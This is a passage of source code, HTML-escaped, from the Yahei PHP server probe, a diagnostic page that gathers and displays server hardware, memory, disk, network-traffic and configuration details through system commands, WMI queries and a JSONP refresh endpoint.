	$path = array('/bin', '/sbin', '/usr/bin', '/usr/sbin', '/usr/local/bin', '/usr/local/sbin');

	foreach($path as $p) 
	&#123;

		if (@is_executable(&quot;$p/$commandName&quot;)) return &quot;$p/$commandName&quot;;

	&#125;

	return false;

&#125;



//执行系统命令 FreeBSD

function do_command($commandName, $args)
&#123;

	$buffer = &quot;&quot;;

	if (false === ($command = find_command($commandName))) return false;

	if ($fp = @popen(&quot;$command $args&quot;, 'r')) 
	&#123;

		while (!@feof($fp))
		&#123;

			$buffer .= @fgets($fp, 4096);

		&#125;

		return trim($buffer);

	&#125;

	return false;

&#125;



//windows系统探测

function sys_windows()
&#123;

	if (PHP_VERSION &gt;= 5)
	&#123;

		$objLocator = new COM(&quot;WbemScripting.SWbemLocator&quot;);

		$wmi = $objLocator-&gt;ConnectServer();

		$prop = $wmi-&gt;get(&quot;Win32_PnPEntity&quot;);

	&#125;
	else
	&#123;
		return false;

	&#125;



	//CPU

	$cpuinfo = GetWMI($wmi,&quot;Win32_Processor&quot;, array(&quot;Name&quot;,&quot;L2CacheSize&quot;,&quot;NumberOfCores&quot;));

	$res['cpu']['num'] = $cpuinfo[0]['NumberOfCores'];

	if (null == $res['cpu']['num']) 
	&#123;

		$res['cpu']['num'] = 1;

	&#125;/*

	for ($i=0;$i&lt;$res['cpu']['num'];$i++)
	&#123;

		$res['cpu']['model'] .= $cpuinfo[0]['Name'].&quot;&lt;br /&gt;&quot;;

		$res['cpu']['cache'] .= $cpuinfo[0]['L2CacheSize'].&quot;&lt;br /&gt;&quot;;

	&#125;*/
	$cpuinfo[0]['L2CacheSize'] = ' ('.$cpuinfo[0]['L2CacheSize'].')';
	if($res['cpu']['num']==1)
		$x1 = '';
	else
		$x1 = ' ×'.$res['cpu']['num'];
	$res['cpu']['model'] = $cpuinfo[0]['Name'].$cpuinfo[0]['L2CacheSize'].$x1;

	// SYSINFO

	$sysinfo = GetWMI($wmi,&quot;Win32_OperatingSystem&quot;, array('LastBootUpTime','TotalVisibleMemorySize','FreePhysicalMemory','Caption','CSDVersion','SerialNumber','InstallDate'));

	$sysinfo[0]['Caption']=iconv('GBK', 'UTF-8',$sysinfo[0]['Caption']);

	$sysinfo[0]['CSDVersion']=iconv('GBK', 'UTF-8',$sysinfo[0]['CSDVersion']);

	$res['win_n'] = $sysinfo[0]['Caption'].&quot; &quot;.$sysinfo[0]['CSDVersion'].&quot; 序列号:&#123;$sysinfo[0]['SerialNumber']&#125; 于&quot;.date('Y年m月d日H:i:s',strtotime(substr($sysinfo[0]['InstallDate'],0,14))).&quot;安装&quot;;

	//UPTIME

	$res['uptime'] = $sysinfo[0]['LastBootUpTime'];


	$sys_ticks = 3600*8 + time() - strtotime(substr($res['uptime'],0,14));

	$min = $sys_ticks / 60;

	$hours = $min / 60;

	$days = floor($hours / 24);

	$hours = floor($hours - ($days * 24));

	$min = floor($min - ($days * 60 * 24) - ($hours * 60));

	if ($days !== 0) $res['uptime'] = $days.&quot;天&quot;;

	if ($hours !== 0) $res['uptime'] .= $hours.&quot;小时&quot;;

	$res['uptime'] .= $min.&quot;分钟&quot;;


	//MEMORY

	$res['memTotal'] = round($sysinfo[0]['TotalVisibleMemorySize']/1024,2);

	$res['memFree'] = round($sysinfo[0]['FreePhysicalMemory']/1024,2);

	$res['memUsed'] = $res['memTotal']-$res['memFree'];	//上面两行已经除以1024,这行不用再除了

	$res['memPercent'] = round($res['memUsed'] / $res['memTotal']*100,2);


	$swapinfo = GetWMI($wmi,&quot;Win32_PageFileUsage&quot;, array('AllocatedBaseSize','CurrentUsage'));


	// LoadPercentage

	$loadinfo = GetWMI($wmi,&quot;Win32_Processor&quot;, array(&quot;LoadPercentage&quot;));

	$res['loadAvg'] = $loadinfo[0]['LoadPercentage'];


	return $res;

&#125;



function GetWMI($wmi,$strClass, $strValue = array())
&#123;

	$arrData = array();


	$objWEBM = $wmi-&gt;Get($strClass);

	$arrProp = $objWEBM-&gt;Properties_;

	$arrWEBMCol = $objWEBM-&gt;Instances_();

	foreach($arrWEBMCol as $objItem) 
	&#123;

		@reset($arrProp);

		$arrInstance = array();

		foreach($arrProp as $propItem) 
		&#123;

			eval(&quot;\$value = \$objItem-&gt;&quot; . $propItem-&gt;Name . &quot;;&quot;);

			if (empty($strValue)) 
			&#123;

				$arrInstance[$propItem-&gt;Name] = trim($value);

			&#125; 
			else
			&#123;

				if (in_array($propItem-&gt;Name, $strValue)) 
				&#123;

					$arrInstance[$propItem-&gt;Name] = trim($value);

				&#125;

			&#125;

		&#125;

		$arrData[] = $arrInstance;

	&#125;

	return $arrData;

&#125;



//比例条

function bar($percent)
&#123;

?&gt;

	&lt;div class=&quot;bar&quot;&gt;&lt;div class=&quot;barli&quot; style=&quot;width:&lt;?php echo $percent?&gt;%&quot;&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;

&lt;?php

&#125;



$uptime = $sysInfo['uptime']; //在线时间

$stime = date('Y-m-d H:i:s'); //系统当前时间

//硬盘

$dt = round(@disk_total_space(&quot;.&quot;)/(1024*1024*1024),3); //总
$df = round(@disk_free_space(&quot;.&quot;)/(1024*1024*1024),3); //可用
$du = $dt-$df; //已用
$hdPercent = (floatval($dt)!=0)?round($du/$dt*100,2):0;

$load = $sysInfo['loadAvg'];	//系统负载


//判断内存如果小于1G，就显示M，否则显示G单位
if($sysInfo['memTotal']&lt;1024)
&#123;
	$memTotal = $sysInfo['memTotal'].&quot; M&quot;;
	$mt = $sysInfo['memTotal'].&quot; M&quot;;
	$mu = $sysInfo['memUsed'].&quot; M&quot;;
	$mf = $sysInfo['memFree'].&quot; M&quot;;
	$mc = $sysInfo['memCached'].&quot; M&quot;;	//cache化内存
	$mb = $sysInfo['memBuffers'].&quot; M&quot;;	//缓冲
	$st = $sysInfo['swapTotal'].&quot; M&quot;;
	$su = $sysInfo['swapUsed'].&quot; M&quot;;
	$sf = $sysInfo['swapFree'].&quot; M&quot;;
	$swapPercent = $sysInfo['swapPercent'];
	$memRealUsed = $sysInfo['memRealUsed'].&quot; M&quot;; //真实内存使用
	$memRealFree = $sysInfo['memRealFree'].&quot; M&quot;; //真实内存空闲
	$memRealPercent = $sysInfo['memRealPercent']; //真实内存使用比率
	$memPercent = $sysInfo['memPercent']; //内存总使用率
	$memCachedPercent = $sysInfo['memCachedPercent']; //cache内存使用率
&#125;
else
&#123;
	$memTotal = round($sysInfo['memTotal']/1024,3).&quot; G&quot;;
	$mt = round($sysInfo['memTotal']/1024,3).&quot; G&quot;;
	$mu = round($sysInfo['memUsed']/1024,3).&quot; G&quot;;
	$mf = round($sysInfo['memFree']/1024,3).&quot; G&quot;;
	$mc = round($sysInfo['memCached']/1024,3).&quot; G&quot;;
	$mb = round($sysInfo['memBuffers']/1024,3).&quot; G&quot;;
	$st = round($sysInfo['swapTotal']/1024,3).&quot; G&quot;;
	$su = round($sysInfo['swapUsed']/1024,3).&quot; G&quot;;
	$sf = round($sysInfo['swapFree']/1024,3).&quot; G&quot;;
	$swapPercent = $sysInfo['swapPercent'];
	$memRealUsed = round($sysInfo['memRealUsed']/1024,3).&quot; G&quot;; //真实内存使用
	$memRealFree = round($sysInfo['memRealFree']/1024,3).&quot; G&quot;; //真实内存空闲
	$memRealPercent = $sysInfo['memRealPercent']; //真实内存使用比率
	$memPercent = $sysInfo['memPercent']; //内存总使用率
	$memCachedPercent = $sysInfo['memCachedPercent']; //cache内存使用率
&#125;


//网卡流量

$strs = @file(&quot;/proc/net/dev&quot;); 



for ($i = 2; $i &lt; count($strs); $i++ )
&#123;
	preg_match_all( &quot;/([^\s]+):[\s]&#123;0,&#125;(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)/&quot;, $strs[$i], $info );
	$NetOutSpeed[$i] = $info[10][0];
	$NetInputSpeed[$i] = $info[2][0];
	$NetInput[$i] = formatsize($info[2][0]);
	$NetOut[$i]  = formatsize($info[10][0]);
&#125;


//ajax调用实时刷新

if ($_GET['act'] == &quot;rt&quot;)

&#123;

	$arr=array('useSpace'=&gt;&quot;$du&quot;,'freeSpace'=&gt;&quot;$df&quot;,'hdPercent'=&gt;&quot;$hdPercent&quot;,'barhdPercent'=&gt;&quot;$hdPercent%&quot;,'TotalMemory'=&gt;&quot;$mt&quot;,'UsedMemory'=&gt;&quot;$mu&quot;,'FreeMemory'=&gt;&quot;$mf&quot;,'CachedMemory'=&gt;&quot;$mc&quot;,'Buffers'=&gt;&quot;$mb&quot;,'TotalSwap'=&gt;&quot;$st&quot;,'swapUsed'=&gt;&quot;$su&quot;,'swapFree'=&gt;&quot;$sf&quot;,'loadAvg'=&gt;&quot;$load&quot;,'uptime'=&gt;&quot;$uptime&quot;,'freetime'=&gt;&quot;$freetime&quot;,'bjtime'=&gt;&quot;$bjtime&quot;,'stime'=&gt;&quot;$stime&quot;,'memRealPercent'=&gt;&quot;$memRealPercent&quot;,'memRealUsed'=&gt;&quot;$memRealUsed&quot;,'memRealFree'=&gt;&quot;$memRealFree&quot;,'memPercent'=&gt;&quot;$memPercent%&quot;,'memCachedPercent'=&gt;&quot;$memCachedPercent&quot;,'barmemCachedPercent'=&gt;&quot;$memCachedPercent%&quot;,'swapPercent'=&gt;&quot;$swapPercent&quot;,'barmemRealPercent'=&gt;&quot;$memRealPercent%&quot;,'barswapPercent'=&gt;&quot;$swapPercent%&quot;,'NetOut2'=&gt;&quot;$NetOut[2]&quot;,'NetOut3'=&gt;&quot;$NetOut[3]&quot;,'NetOut4'=&gt;&quot;$NetOut[4]&quot;,'NetOut5'=&gt;&quot;$NetOut[5]&quot;,'NetOut6'=&gt;&quot;$NetOut[6]&quot;,'NetOut7'=&gt;&quot;$NetOut[7]&quot;,'NetOut8'=&gt;&quot;$NetOut[8]&quot;,'NetOut9'=&gt;&quot;$NetOut[9]&quot;,'NetOut10'=&gt;&quot;$NetOut[10]&quot;,'NetInput2'=&gt;&quot;$NetInput[2]&quot;,'NetInput3'=&gt;&quot;$NetInput[3]&quot;,'NetInput4'=&gt;&quot;$NetInput[4]&quot;,'NetInput5'=&gt;&quot;$NetInput[5]&quot;,'NetInput6'=&gt;&quot;$NetInput[6]&quot;,'NetInput7'=&gt;&quot;$NetInput[7]&quot;,'NetInput8'=&gt;&quot;$NetInput[8]&quot;,'NetInput9'=&gt;&quot;$NetInput[9]&quot;,'NetInput10'=&gt;&quot;$NetInput[10]&quot;,'NetOutSpeed2'=&gt;&quot;$NetOutSpeed[2]&quot;,'NetOutSpeed3'=&gt;&quot;$NetOutSpeed[3]&quot;,'NetOutSpeed4'=&gt;&quot;$NetOutSpeed[4]&quot;,'NetOutSpeed5'=&gt;&quot;$NetOutSpeed[5]&quot;,'NetInputSpeed2'=&gt;&quot;$NetInputSpeed[2]&quot;,'NetInputSpeed3'=&gt;&quot;$NetInputSpeed[3]&quot;,'NetInputSpeed4'=&gt;&quot;$NetInputSpeed[4]&quot;,'NetInputSpeed5'=&gt;&quot;$NetInputSpeed[5]&quot;);

	$jarr=json_encode($arr); 
	$_GET['callback'] = htmlspecialchars($_GET['callback']);

	echo $_GET['callback'],'(',$jarr,')';

	exit;

&#125;

?&gt;

&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;

&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;

&lt;head&gt;
&lt;title&gt;&lt;?php echo $title.$version; ?&gt;&lt;/title&gt;
&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=EmulateIE7&quot; /&gt;

&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;!-- Powered by: Yahei.Net --&gt;

&lt;style type=&quot;text/css&quot;&gt;
&lt;!--
* &#123;font-family: &quot;Microsoft Yahei&quot;,Tahoma, Arial; &#125;
body&#123;text-align: center; margin: 0 auto; padding: 0; background-color:#fafafa;font-size:12px;font-family:Tahoma, Arial&#125;
h1 &#123;font-size: 26px; padding: 0; margin: 0; color: #333333; font-family: &quot;Lucida Sans Unicode&quot;,&quot;Lucida Grande&quot;,sans-serif;&#125;
h1 small &#123;font-size: 11px; font-family: Tahoma; font-weight: bold; &#125;
a&#123;color: #666; text-decoration:none;&#125;
a.black&#123;color: #000000; text-decoration:none;&#125;
table&#123;width:100%;clear:both;padding: 0; margin: 0 0 10px;border-collapse:collapse; border-spacing: 0;
box-shadow: 1px 1px 1px #CCC;
-moz-box-shadow: 1px 1px 1px #CCC;
-webkit-box-shadow: 1px 1px 1px #CCC;
-ms-filter: &quot;progid:DXImageTransform.Microsoft.Shadow(Strength=2, Direction=135, Color='#CCCCCC')&quot;;&#125;
th&#123;padding: 3px 6px; font-weight:bold;background:#dedede;color:#626262;border:1px solid #cccccc; text-align:left;&#125;
tr&#123;padding: 0; background:#FFFFFF;&#125;
td&#123;padding: 3px 6px; border:1px solid #CCCCCC;&#125;
.w_logo&#123;height:25px;text-align:center;color:#333;FONT-SIZE: 15px; width:13%; &#125;
.w_top&#123;height:25px;text-align:center; width:8.7%;&#125;
.w_top:hover&#123;background:#dadada;&#125;
.w_foot&#123;height:25px;text-align:center; background:#dedede;&#125;
input&#123;padding: 2px; background: #FFFFFF; border-top:1px solid #666666; border-left:1px solid #666666; border-right:1px solid #CCCCCC; border-bottom:1px solid #CCCCCC; font-size:12px&#125;
input.btn&#123;font-weight: bold; height: 20px; line-height: 20px; padding: 0 6px; color:#666666; background: #f2f2f2; border:1px solid #999;font-size:12px&#125;
.bar &#123;border:1px solid #999999; background:#FFFFFF; height:5px; font-size:2px; width:89%; margin:2px 0 5px 0;padding:1px; overflow: hidden;&#125;
.bar_1 &#123;border:1px dotted #999999; background:#FFFFFF; height:5px; font-size:2px; width:89%; margin:2px 0 5px 0;padding:1px; overflow: hidden;&#125;
.barli_red&#123;background:#ff6600; height:5px; margin:0px; padding:0;&#125;
.barli_blue&#123;background:#0099FF; height:5px; margin:0px; padding:0;&#125;
.barli_green&#123;background:#36b52a; height:5px; margin:0px; padding:0;&#125;
.barli_black&#123;background:#333; height:5px; margin:0px; padding:0;&#125;
.barli_1&#123;background:#999999; height:5px; margin:0px; padding:0;&#125;
.barli&#123;background:#36b52a; height:5px; margin:0px; padding:0;&#125;
#page &#123;width: 960px; padding: 0 auto; margin: 0 auto; text-align: left;&#125;
#header&#123;position:relative; padding:5px;&#125;
.w_small&#123;font-family: Courier New;&#125;
.w_number&#123;color: #f800fe;&#125;
.sudu &#123;padding: 0; background:#5dafd1; &#125;
.suduk &#123; margin:0px; padding:0;&#125;
.resYes&#123;&#125;
.resNo&#123;color: #FF0000;&#125;
.word&#123;word-break:break-all;&#125;
--&gt;
&lt;/style&gt;

&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot; src=&quot;http://lib.sinaapp.com/js/jquery/1.7/jquery.min.js&quot;&gt;&lt;/script&gt;

&lt;script type=&quot;text/javascript&quot;&gt; 

&lt;!--

$(document).ready(function()&#123;getJSONData();&#125;);
var OutSpeed2=&lt;?php echo floor($NetOutSpeed[2]) ?&gt;;
var OutSpeed3=&lt;?php echo floor($NetOutSpeed[3]) ?&gt;;
var OutSpeed4=&lt;?php echo floor($NetOutSpeed[4]) ?&gt;;
var OutSpeed5=&lt;?php echo floor($NetOutSpeed[5]) ?&gt;;
var InputSpeed2=&lt;?php echo floor($NetInputSpeed[2]) ?&gt;;
var InputSpeed3=&lt;?php echo floor($NetInputSpeed[3]) ?&gt;;
var InputSpeed4=&lt;?php echo floor($NetInputSpeed[4]) ?&gt;;
var InputSpeed5=&lt;?php echo floor($NetInputSpeed[5]) ?&gt;;

function getJSONData()

&#123;

	setTimeout(&quot;getJSONData()&quot;, 1000);

	$.getJSON('?act=rt&amp;callback=?', displayData);

&#125;
function ForDight(Dight,How)
&#123; 
  if (Dight&lt;0)&#123;
  	var Last=0+&quot;B/s&quot;;
  &#125;else if (Dight&lt;1024)&#123;
  	var Last=Math.round(Dight*Math.pow(10,How))/Math.pow(10,How)+&quot;B/s&quot;;
  &#125;else if (Dight&lt;1048576)&#123;
  	Dight=Dight/1024;
  	var Last=Math.round(Dight*Math.pow(10,How))/Math.pow(10,How)+&quot;K/s&quot;;
  &#125;else&#123;
  	Dight=Dight/1048576;
  	var Last=Math.round(Dight*Math.pow(10,How))/Math.pow(10,How)+&quot;M/s&quot;;
  &#125;
	return Last; 
&#125;

function displayData(dataJSON)

&#123;
	$(&quot;#useSpace&quot;).html(dataJSON.useSpace);

	$(&quot;#freeSpace&quot;).html(dataJSON.freeSpace);
	$(&quot;#hdPercent&quot;).html(dataJSON.hdPercent);
	$(&quot;#barhdPercent&quot;).width(dataJSON.barhdPercent);

	$(&quot;#TotalMemory&quot;).html(dataJSON.TotalMemory);

	$(&quot;#UsedMemory&quot;).html(dataJSON.UsedMemory);

	$(&quot;#FreeMemory&quot;).html(dataJSON.FreeMemory);

	$(&quot;#CachedMemory&quot;).html(dataJSON.CachedMemory);
	$(&quot;#Buffers&quot;).html(dataJSON.Buffers);

	$(&quot;#TotalSwap&quot;).html(dataJSON.TotalSwap);

	$(&quot;#swapUsed&quot;).html(dataJSON.swapUsed);

	$(&quot;#swapFree&quot;).html(dataJSON.swapFree);

	$(&quot;#swapPercent&quot;).html(dataJSON.swapPercent);

	$(&quot;#loadAvg&quot;).html(dataJSON.loadAvg);

	$(&quot;#uptime&quot;).html(dataJSON.uptime);

	$(&quot;#freetime&quot;).html(dataJSON.freetime);

	$(&quot;#stime&quot;).html(dataJSON.stime);

	$(&quot;#bjtime&quot;).html(dataJSON.bjtime);

	$(&quot;#memRealUsed&quot;).html(dataJSON.memRealUsed);
	$(&quot;#memRealFree&quot;).html(dataJSON.memRealFree);
	$(&quot;#memRealPercent&quot;).html(dataJSON.memRealPercent);

	$(&quot;#memPercent&quot;).html(dataJSON.memPercent);
	$(&quot;#barmemPercent&quot;).width(dataJSON.memPercent);

	$(&quot;#barmemRealPercent&quot;).width(dataJSON.barmemRealPercent);
	$(&quot;#memCachedPercent&quot;).html(dataJSON.memCachedPercent);
	$(&quot;#barmemCachedPercent&quot;).width(dataJSON.barmemCachedPercent);

	$(&quot;#barswapPercent&quot;).width(dataJSON.barswapPercent);

	$(&quot;#NetOut2&quot;).html(dataJSON.NetOut2);

	$(&quot;#NetOut3&quot;).html(dataJSON.NetOut3);

	$(&quot;#NetOut4&quot;).html(dataJSON.NetOut4);

	$(&quot;#NetOut5&quot;).html(dataJSON.NetOut5);

	$(&quot;#NetOut6&quot;).html(dataJSON.NetOut6);

	$(&quot;#NetOut7&quot;).html(dataJSON.NetOut7);

	$(&quot;#NetOut8&quot;).html(dataJSON.NetOut8);

	$(&quot;#NetOut9&quot;).html(dataJSON.NetOut9);

	$(&quot;#NetOut10&quot;).html(dataJSON.NetOut10);
	$(&quot;#NetInput2&quot;).html(dataJSON.NetInput2);
	$(&quot;#NetInput3&quot;).html(dataJSON.NetInput3);
	$(&quot;#NetInput4&quot;).html(dataJSON.NetInput4);
	$(&quot;#NetInput5&quot;).html(dataJSON.NetInput5);
	$(&quot;#NetInput6&quot;).html(dataJSON.NetInput6);
	$(&quot;#NetInput7&quot;).html(dataJSON.NetInput7);
	$(&quot;#NetInput8&quot;).html(dataJSON.NetInput8);
	$(&quot;#NetInput9&quot;).html(dataJSON.NetInput9);
	$(&quot;#NetInput10&quot;).html(dataJSON.NetInput10);	
	$(&quot;#NetOutSpeed2&quot;).html(ForDight((dataJSON.NetOutSpeed2-OutSpeed2),3));	OutSpeed2=dataJSON.NetOutSpeed2;
	$(&quot;#NetOutSpeed3&quot;).html(ForDight((dataJSON.NetOutSpeed3-OutSpeed3),3));	OutSpeed3=dataJSON.NetOutSpeed3;
	$(&quot;#NetOutSpeed4&quot;).html(ForDight((dataJSON.NetOutSpeed4-OutSpeed4),3));	OutSpeed4=dataJSON.NetOutSpeed4;
	$(&quot;#NetOutSpeed5&quot;).html(ForDight((dataJSON.NetOutSpeed5-OutSpeed5),3));	OutSpeed5=dataJSON.NetOutSpeed5;
	$(&quot;#NetInputSpeed2&quot;).html(ForDight((dataJSON.NetInputSpeed2-InputSpeed2),3));	InputSpeed2=dataJSON.NetInputSpeed2;
	$(&quot;#NetInputSpeed3&quot;).html(ForDight((dataJSON.NetInputSpeed3-InputSpeed3),3));	InputSpeed3=dataJSON.NetInputSpeed3;
	$(&quot;#NetInputSpeed4&quot;).html(ForDight((dataJSON.NetInputSpeed4-InputSpeed4),3));	InputSpeed4=dataJSON.NetInputSpeed4;
	$(&quot;#NetInputSpeed5&quot;).html(ForDight((dataJSON.NetInputSpeed5-InputSpeed5),3));	InputSpeed5=dataJSON.NetInputSpeed5;

&#125;

--&gt;

&lt;/script&gt;

&lt;/head&gt;

&lt;body&gt;
&lt;a name=&quot;w_top&quot;&gt;&lt;/a&gt;

&lt;div id=&quot;page&quot;&gt;

	
	&lt;table&gt;
		&lt;tr&gt;
			&lt;th class=&quot;w_logo&quot;&gt;雅黑PHP探针&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_php&quot;&gt;PHP参数&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_module&quot;&gt;组件支持&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_module_other&quot;&gt;第三方组件&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_db&quot;&gt;数据库支持&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_performance&quot;&gt;性能检测&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_networkspeed&quot;&gt;网速检测&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_MySQL&quot;&gt;MySQL检测&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_function&quot;&gt;函数检测&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;#w_mail&quot;&gt;邮件检测&lt;/a&gt;&lt;/th&gt;
			&lt;th class=&quot;w_top&quot;&gt;&lt;a href=&quot;http://www.yahei.net/tz/tz.zip&quot;&gt;探针下载&lt;/a&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/table&gt;



&lt;!--服务器相关参数--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan=&quot;4&quot;&gt;服务器参数&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;服务器域名/IP地址&lt;/td&gt;

    &lt;td colspan=&quot;3&quot;&gt;&lt;?php echo @get_current_user();?&gt; - &lt;?php echo $_SERVER['SERVER_NAME'];?&gt;(&lt;?php if('/'==DIRECTORY_SEPARATOR)&#123;echo $_SERVER['SERVER_ADDR'];&#125;else&#123;echo @gethostbyname($_SERVER['SERVER_NAME']);&#125; ?&gt;)&amp;nbsp;&amp;nbsp;你的IP地址是：&lt;?php echo @$_SERVER['REMOTE_ADDR'];?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;服务器标识&lt;/td&gt;

    &lt;td colspan=&quot;3&quot;&gt;&lt;?php if($sysInfo['win_n'] != '')&#123;echo $sysInfo['win_n'];&#125;else&#123;echo @php_uname();&#125;;?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;13%&quot;&gt;服务器操作系统&lt;/td&gt;

    &lt;td width=&quot;37%&quot;&gt;&lt;?php $os = explode(&quot; &quot;, php_uname()); echo $os[0];?&gt; &amp;nbsp;内核版本：&lt;?php if('/'==DIRECTORY_SEPARATOR)&#123;echo $os[2];&#125;else&#123;echo $os[1];&#125; ?&gt;&lt;/td&gt;

    &lt;td width=&quot;13%&quot;&gt;服务器解译引擎&lt;/td&gt;

    &lt;td width=&quot;37%&quot;&gt;&lt;?php echo $_SERVER['SERVER_SOFTWARE'];?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;服务器语言&lt;/td&gt;

    &lt;td&gt;&lt;?php echo getenv(&quot;HTTP_ACCEPT_LANGUAGE&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;服务器端口&lt;/td&gt;

    &lt;td&gt;&lt;?php echo $_SERVER['SERVER_PORT'];?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

	  &lt;td&gt;服务器主机名&lt;/td&gt;

	  &lt;td&gt;&lt;?php if('/'==DIRECTORY_SEPARATOR )&#123;echo $os[1];&#125;else&#123;echo $os[2];&#125; ?&gt;&lt;/td&gt;

	  &lt;td&gt;绝对路径&lt;/td&gt;

	  &lt;td&gt;&lt;?php echo $_SERVER['DOCUMENT_ROOT']?str_replace('\\','/',$_SERVER['DOCUMENT_ROOT']):str_replace('\\','/',dirname(__FILE__));?&gt;&lt;/td&gt;

	&lt;/tr&gt;

  &lt;tr&gt;

	  &lt;td&gt;管理员邮箱&lt;/td&gt;

	  &lt;td&gt;&lt;?php echo $_SERVER['SERVER_ADMIN'];?&gt;&lt;/td&gt;

		&lt;td&gt;探针路径&lt;/td&gt;

		&lt;td&gt;&lt;?php echo str_replace('\\','/',__FILE__)?str_replace('\\','/',__FILE__):$_SERVER['SCRIPT_FILENAME'];?&gt;&lt;/td&gt;

	&lt;/tr&gt;	

&lt;/table&gt;



&lt;?if(&quot;show&quot;==$sysReShow)&#123;?&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan=&quot;6&quot;&gt;服务器实时数据&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;13%&quot; &gt;服务器当前时间&lt;/td&gt;

    &lt;td width=&quot;37%&quot; &gt;&lt;span id=&quot;stime&quot;&gt;&lt;?php echo $stime;?&gt;&lt;/span&gt;&lt;/td&gt;

    &lt;td width=&quot;13%&quot; &gt;服务器已运行时间&lt;/td&gt;

    &lt;td width=&quot;37%&quot; colspan=&quot;3&quot;&gt;&lt;span id=&quot;uptime&quot;&gt;&lt;?php echo $uptime;?&gt;&lt;/span&gt;&lt;/td&gt;

  &lt;/tr&gt;
  &lt;tr&gt;

    &lt;td width=&quot;13%&quot;&gt;CPU型号 [&lt;?php echo $sysInfo['cpu']['num'];?&gt;核]&lt;/td&gt;

    &lt;td width=&quot;87%&quot; colspan=&quot;5&quot;&gt;&lt;?php echo $sysInfo['cpu']['model'];?&gt;&lt;/td&gt;

  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;CPU使用状况&lt;/td&gt;
    &lt;td colspan=&quot;5&quot;&gt;&lt;?php if('/'==DIRECTORY_SEPARATOR)&#123;echo $cpu_show.&quot; | &lt;a href='&quot;.$phpSelf.&quot;?act=cpu_percentage' target='_blank' class='static'&gt;查看图表&lt;/a&gt;&quot;;&#125;else&#123;echo &quot;暂时只支持Linux系统&quot;;&#125;?&gt;
	&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;硬盘使用状况&lt;/td&gt;
    &lt;td colspan=&quot;5&quot;&gt;
		总空间 &lt;?php echo $dt;?&gt;&amp;nbsp;G，
		已用 &lt;font color='#333333'&gt;&lt;span id=&quot;useSpace&quot;&gt;&lt;?php echo $du;?&gt;&lt;/span&gt;&lt;/font&gt;&amp;nbsp;G，
		空闲 &lt;font color='#333333'&gt;&lt;span id=&quot;freeSpace&quot;&gt;&lt;?php echo $df;?&gt;&lt;/span&gt;&lt;/font&gt;&amp;nbsp;G，
		使用率 &lt;span id=&quot;hdPercent&quot;&gt;&lt;?php echo $hdPercent;?&gt;&lt;/span&gt;%
		&lt;div class=&quot;bar&quot;&gt;&lt;div id=&quot;barhdPercent&quot; class=&quot;barli_black&quot; style=&quot;width:&lt;?php echo $hdPercent;?&gt;%&quot; &gt;&amp;nbsp;&lt;/div&gt; &lt;/div&gt;
	&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;

		&lt;td&gt;内存使用状况&lt;/td&gt;

		&lt;td colspan=&quot;5&quot;&gt;

&lt;?php

$tmp = array(

    'memTotal', 'memUsed', 'memFree', 'memPercent',

    'memCached', 'memRealPercent',

    'swapTotal', 'swapUsed', 'swapFree', 'swapPercent'

);

foreach ($tmp AS $v) &#123;

    $sysInfo[$v] = $sysInfo[$v] ? $sysInfo[$v] : 0;

&#125;

?&gt;

          物理内存：共

          &lt;font color='#CC0000'&gt;&lt;?php echo $memTotal;?&gt; &lt;/font&gt;

           , 已用

          &lt;font color='#CC0000'&gt;&lt;span id=&quot;UsedMemory&quot;&gt;&lt;?php echo $mu;?&gt;&lt;/span&gt;&lt;/font&gt;

          , 空闲

          &lt;font color='#CC0000'&gt;&lt;span id=&quot;FreeMemory&quot;&gt;&lt;?php echo $mf;?&gt;&lt;/span&gt;&lt;/font&gt;

          , 使用率

		  &lt;span id=&quot;memPercent&quot;&gt;&lt;?php echo $memPercent;?&gt;&lt;/span&gt;

          &lt;div class=&quot;bar&quot;&gt;&lt;div id=&quot;barmemPercent&quot; class=&quot;barli_green&quot; style=&quot;width:&lt;?php echo $memPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;/div&gt; &lt;/div&gt;
&lt;?php
//判断如果cache为0，不显示
if($sysInfo['memCached']&gt;0)
&#123;
